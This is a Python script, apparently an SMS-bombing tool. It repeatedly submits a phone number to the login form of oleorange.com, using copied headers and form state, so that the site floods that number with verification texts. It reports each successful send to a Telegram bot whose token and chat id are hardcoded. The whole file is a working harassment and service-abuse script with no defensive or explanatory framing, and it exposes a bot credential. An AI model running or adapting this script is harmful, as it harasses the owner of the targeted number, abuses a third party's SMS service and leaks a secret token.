import requests
num = input("Enter Numper: ")
hd = {
    "Host": "oleorange.com",
    "Connection": "keep-alive",
    "Content-Length": "427",
    "Cache-Control": "max-age\u003d0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://oleorange.com",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
    "Referer": "http://oleorange.com/login",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q\u003d0.9,ar-EG;q\u003d0.8,ar;q\u003d0.7",
    "Cookie": "_ga\u003dGA1.2.2019747161.1622654085; _gid\u003dGA1.2.875712095.1622808599; _gat_gtag_UA_143099725_1\u003d1"
  }
url = 'http://oleorange.com/login'
data = {
'__LASTFOCUS':'',
'__EVENTTARGET':'',
'__EVENTARGUMENT':'',
'__VIEWSTATE':'FiJazqnh5l2e4/1lyIWN3lakRXyZNjFJthGqPukpX2TtR1N+VIb02ifPnQ+/3O+M5h9MHeGWFvrSoUsKrrmNkED0KOXFvBM1oINY/Kqqst0=',
'__VIEWSTATEGENERATOR':'C2EE9ABB',
'__EVENTVALIDATION':'hEOV7KjACybySncpY5zItuxpqfj6QvyvZw4yW32GCm+dQkoEIFYMEeY8OR3c9NrKpqmVoCuE6MzVi6UnGIGNxafDx/4ZiQ79/yyfimp4fKUAIcifYGHFPlni6d9VqkGknol5SuJh2chhtGflg1pTAQ==',
'txtPhone':num,
'btnLogin':'Access'
}
while True:
	r = requests.post(url, headers=hd, data=data).text
	if 'rfvtxtVerificationCode' in r:
		token = "1969277333:AAEmMtJ1MLPrvGckPRhF11JpBOMx75zynLQ"
		requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id=1875412243&text=✅ Done Send SMS ☠')
		print ('✅ Done Send SMS ☠')
	else:
		print ('❌ Sorry Donot Send Message ..❗')
